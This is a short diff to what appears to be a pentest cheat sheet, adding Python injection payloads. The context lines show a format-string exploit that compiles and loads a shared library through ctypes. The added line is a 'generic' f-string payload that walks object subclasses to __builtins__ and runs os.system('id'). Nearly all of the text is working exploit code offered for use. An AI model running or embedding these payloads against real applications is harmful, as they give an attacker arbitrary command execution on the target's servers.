@@ -15,4 +15,7 @@ open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\\n__attribute__((construc
 import os
 os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")
 print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
+
+# F-String rce generique
+f"{(B:=[c for c in ().__class__.__mro__[1].__subclasses__() if c.__init__.__class__.__name__=='function'][0].__init__.__globals__['__builtins__']) and (B['__import__']('os')).system('id')}\""
 ```
